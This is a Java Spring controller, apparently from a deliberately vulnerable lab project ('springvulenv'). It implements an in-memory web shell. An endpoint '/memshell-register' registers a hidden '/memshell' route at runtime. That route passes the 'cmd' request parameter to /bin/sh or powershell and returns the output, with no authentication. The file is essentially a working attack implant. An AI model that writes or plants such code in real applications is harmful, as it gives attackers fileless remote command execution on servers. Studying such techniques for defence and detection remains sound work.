package spring.vul.springvulenv.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.context.support.WebApplicationContextUtils;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestConditionHolder;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.util.Scanner;

@Controller
public class MemshellController {
    @RequestMapping("/memshell-register")
    public void Memshell(HttpServletRequest request, HttpServletResponse response) throws NoSuchMethodException {
        WebApplicationContext context =  (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        assert context != null;
        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);

        PatternsRequestCondition condition = new PatternsRequestCondition("/memshell");
        RequestMethodsRequestCondition methodsRequestCondition = new RequestMethodsRequestCondition(RequestMethod.GET, RequestMethod.POST);
        RequestMappingInfo info = new RequestMappingInfo(condition, methodsRequestCondition, null, null, null, null, null);

        Payload payload = new Payload();
        Method method = Payload.class.getDeclaredMethod("shell");
        requestMappingHandlerMapping.registerMapping(info, payload, method);

    }

    public class Payload {
        String defaultCharSet = "utf-8";
        String cmdTemplate = "%s";//chcp 65001&

        @ResponseBody
        public String shell() {
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                try {
                    String charSet = request.getParameter("charset");
                    if (charSet != null) {
                        charSet = charSet.trim();
                    } else {
                        charSet = new String();
                    }
                    String[] cmds = null;
                    if (File.separator.equals("/")) {
                        cmds = new String[]{"/bin/sh", "-c", String.format(cmdTemplate, request.getParameter("cmd"))};
                    } else {
                        cmds = new String[]{"powershell", "/C", String.format(cmdTemplate, request.getParameter("cmd"))};
                    }
                    InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                    InputStreamReader reader = new InputStreamReader(inputStream, charSet.isEmpty() ? Charset.forName(defaultCharSet) : Charset.forName(charSet));
                    Scanner scanner = new Scanner(reader).useDelimiter("\\A");
                    StringBuilder stringBuilder = new StringBuilder();
                    while (scanner.hasNextLine()) {
                        stringBuilder.append(scanner.nextLine());
                    }
                    String result = stringBuilder.toString();
                    return result;
//                    response.getWriter().println(result);
                } catch (Exception e) {
                    //                        response.getWriter().println("Exception:" + e.getClass().getName() + e.getMessage());
                    return ("Exception:" + e.getClass().getName() + e.getMessage());
                }
            }
            return "Complete";
        }
    }
}
